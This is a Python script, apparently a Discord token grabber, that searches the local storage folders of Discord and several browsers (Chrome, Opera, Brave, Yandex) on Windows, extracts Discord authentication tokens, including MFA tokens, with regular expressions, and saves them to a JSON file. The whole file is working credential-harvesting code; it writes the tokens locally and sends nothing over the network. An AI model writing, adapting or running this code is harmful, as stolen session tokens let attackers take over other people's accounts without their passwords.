import os
import re
import json
import enum
import argparse
from rich.progress import Progress

class TokenFinder:

    def __init__(self, output_file, custom_paths=None):
        self.output_file = output_file
        self.local = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.paths = {
            'Discord': self.roaming + '\\Discord',
            'Discord Canary': self.roaming + '\\discordcanary',
            'Discord PTB': self.roaming + '\\discordptb',
            'Google Chrome': self.local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable',
            'Brave': self.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': self.local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }

        if custom_paths:
            self.paths.update(custom_paths)

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        pass

    def find_tokens(self, path):
        path += '\\Local Storage\\leveldb'

        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            with open(f'{path}\\{file_name}', errors='ignore', encoding='utf-8') as f:
                for line in [x.strip() for x in f.readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            yield token

    def run(self):
        data = {}
        statistics = {}

        with Progress() as progress:
            task = progress.add_task("[cyan]Gathering Tokens...", total=len(self.paths))
            for platform, path in self.paths.items():
                if os.path.exists(path):
                    tokens = list(self.find_tokens(path))
                    data[platform] = tokens
                    statistics[platform] = len(tokens)
                progress.advance(task)

        with open(self.output_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)

        print('Done!')

        print('\nStats:')
        for platform, count in statistics.items():
            print(f'{platform}: {count} token(s)')

# class Arg(enum.Enum):
#     def __init__(self, options=None, default=None, description=None, required=True):
#         self.options = options
#         self.default = default
#         self.description = description
#         self.required = required

# class ArgumentParser:
#     def __init__(self):
#         self.arguments = []

#     def add_argument(self, options=None, default=None, description=None, required=True):
#         self.arguments.append(Arg(options, default, description, required))

#     def parse_args(self):
#         args = {}
#         for arg in self.arguments:
#             if arg.options:
#                 for option in arg.options:
#                     if option.startswith('--'):
#                         args[option[2:]] = arg.default
#                     elif option.startswith('-'):
#                         args[option[1:]] = arg.default
#             else:
#                 args[arg] = arg.default

#         return args


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--output-file', '-o', default='output.json', help='Output file name')
    parser.add_argument('--custom-paths', '-c', nargs='*', help='Custom paths (platform=path)')
    args = parser.parse_args()

    custom_paths = {}
    if args.custom_paths:
        for custom_path in args.custom_paths:
            platform, path = custom_path.split('=')
            custom_paths[platform] = path

    with TokenFinder(args.output_file, custom_paths) as token_finder:
        token_finder.run()
